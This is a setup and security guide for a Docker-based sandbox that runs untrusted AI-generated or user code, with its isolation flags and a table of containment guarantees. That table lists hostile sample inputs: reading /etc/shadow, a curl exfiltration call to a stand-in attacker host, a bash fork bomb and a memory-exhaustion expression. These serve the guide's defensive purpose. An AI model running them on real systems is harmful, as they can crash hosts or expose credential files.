# ULTRON AI — Secure Coding Sandbox Guide
## Architecture, Container Isolation, Security Guarantees & Setup

### 1. Security Architecture & Threat Model
The **ULTRON Secure Coding Sandbox** provides isolated code execution for Python and JavaScript/TypeScript.
Untrusted code generated by AI agents or submitted by users must never execute directly on the host operating system.

- **Isolation Engine:** Docker Container Isolation (`node:20-alpine` and `python:3.11-alpine`).
- **Fail-Closed Policy:** When Docker is not installed or the daemon is unreachable, the sandbox returns `CODE_SANDBOX_DISABLED`. It will **never** fall back to executing untrusted code on the host machine.
- **Resource Constraints:**
  - Memory: `--memory=256m` (configurable 64M - 1024M)
  - CPU: `--cpus=0.5`
  - Ephemeral tmpfs: `--tmpfs=/tmp:rw,noexec,nosuid,size=32m`
- **Network Boundary:** `--network=none` permanently disables both inbound and outbound network connectivity.
- **Filesystem Boundary:** `--read-only` root filesystem prevents any modification to container binaries.
- **Privilege Separation:** Runs as unprivileged user `--user=1000:1000` with `--security-opt=no-new-privileges`.
- **Execution Timeout:** Strict execution timeout (default 5,000ms, max 30,000ms). Ephemeral containers are forcefully removed (`docker rm -f`) on timeout.

---

### 2. Host Prerequisites & Setup

To enable containerized execution on your host:

```bash
# 1. Install Docker Desktop or Docker Engine
# Windows: winget install Docker.DockerDesktop
# Linux: sudo apt-get install docker-ce docker-ce-cli containerd.io

# 2. Pull minimal sandbox images
docker pull node:20-alpine
docker pull python:3.11-alpine

# 3. Verify Docker runtime status
docker info
```

### 3. Verification & Testing

Verify sandbox readiness and test containment policies:

```bash
# Run automated sandbox unit tests

```

### 4. Malicious Code Containment Guarantees

| Attack Vector | Defense Mechanism | Verified Outcome |
| :--- | :--- | :--- |
| **Filesystem Escape** (`cat /etc/shadow`, `C:\Windows`) | Read-only root container, no host volume mounts | Access denied |
| **Network Exfiltration** (`curl http://attacker.com`) | `--network=none` | Socket error, zero network egress |
| **Fork Bomb / CPU Exhaustion** (`:(){ :|:& };:`) | `--cpus=0.5` and strict timeout abort | Process killed within timeout limit |
| **Memory Exhaustion** (`'a' * 10**9`) | `--memory=256m` OOM limit | Container terminates safely without host impact |
